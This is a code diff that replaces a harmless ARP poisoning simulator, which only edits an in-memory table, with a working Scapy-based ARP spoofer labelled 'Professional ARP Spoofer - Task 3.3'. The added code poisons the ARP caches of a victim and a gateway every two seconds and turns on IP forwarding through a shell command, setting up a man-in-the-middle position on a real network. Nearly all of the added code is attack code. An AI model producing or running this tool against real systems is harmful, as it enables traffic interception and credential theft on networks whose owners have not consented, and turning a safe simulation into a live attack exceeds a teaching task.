@@ -1,58 +1,76 @@
-class Host:
-    def __init__(self, name, ip, mac):
-        self.name = name
-        self.ip = ip
-        self.mac = mac
+from scapy.all import *
+import time
+import sys
+import argparse
+import threading
+import os
 
-class NetworkSimulator:
-    def __init__(self):
-        self.hosts = {
-            "client": Host("Client", "192.168.1.10", "AA:AA:AA:AA:AA:10"),
-            "gateway": Host("Gateway", "192.168.1.1", "GG:GG:GG:GG:GG:01"),
-            "attacker": Host("Attacker", "192.168.1.50", "CC:CC:CC:CC:CC:50"),
-        }
-        self.arp_table = {
-            "192.168.1.1": self.hosts["gateway"].mac,
-            "192.168.1.50": self.hosts["attacker"].mac,
-        }
+def get_mac(ip, retries=3):
+    """Get MAC address of a device with retries for reliability"""
+    for _ in range(retries):
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
+        if ans:
+            return ans[0][1].hwsrc
+    return None
 
-    def show_table(self):
-        print("\nARP table:")
-        for ip, mac in self.arp_table.items():
-            print(f"  {ip} -> {mac}")
+def arp_spoof(victim_ip, gateway_ip):
+    """Main ARP spoofing function - sends fake replies every 2 seconds"""
+    victim_mac = get_mac(victim_ip)
+    gateway_mac = get_mac(gateway_ip)
+    
+    if not victim_mac or not gateway_mac:
+        print("[-] Could not resolve MAC addresses. Check IPs and network.")
+        return
+    
+    print(f"[+] ARP Spoofing started: Victim {victim_ip} <-> Gateway {gateway_ip}")
+    print(f"[+] Victim MAC: {victim_mac} | Gateway MAC: {gateway_mac}")
+    
+    try:
+        while True:
+            # Tell victim that gateway is us
+            arp_reply_victim = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
+            send(arp_reply_victim, verbose=False)
+            
+            # Tell gateway that victim is us
+            arp_reply_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
+            send(arp_reply_gateway, verbose=False)
+            
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[!] ARP Spoofing stopped by user.")
+    finally:
+        restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac)
 
-    def simulate_poisoning(self):
-        attacker_mac = self.hosts["attacker"].mac
-        gateway_ip = self.hosts["gateway"].ip
-        print("\n[SIMULATION] Forged ARP reply is delivered virtually.")
-        print(f"Mapping changes: {gateway_ip} -> {attacker_mac}")
-        self.arp_table[gateway_ip] = attacker_mac
-
-    def reset(self):
-        gateway = self.hosts["gateway"]
-        self.arp_table[gateway.ip] = gateway.mac
-        print("\nARP table restored.")
+def restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac):
+    """Restore original ARP tables - clean exit"""
+    print("[*] Restoring original ARP tables...")
+    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
+    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=False)
+    print("[+] ARP tables restored successfully.")
 
 def main():
-    network = NetworkSimulator()
+    parser = argparse.ArgumentParser(description="Professional ARP Spoofer - Task 3.3")
+    parser.add_argument("-v", "--victim", required=True, help="Victim IP address")
+    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
+    args = parser.parse_args()
+    
 
-    while True:
-        print("\n1. Show ARP table")
-        print("2. Simulate ARP poisoning")
-        print("3. Reset ARP table")
-        print("4. Exit")
-        choice = input("Choose: ").strip()
+    try:
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        print("[+] IP Forwarding enabled")
+    except:
+        print("[-] Could not enable IP forwarding. Run with sudo.")
+    
 
-        if choice == "1":
-            network.show_table()
-        elif choice == "2":
-            network.simulate_poisoning()
-        elif choice == "3":
-            network.reset()
-        elif choice == "4":
-            break
-        else:
-            print("Invalid choice.")
+    spoof_thread = threading.Thread(target=arp_spoof, args=(args.victim, args.gateway), daemon=True)
+    spoof_thread.start()
+    
+    print("ARP Spoofer running. Press Ctrl+C to stop.")
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nShutting down...")
 
 if __name__ == "__main__":
     main()
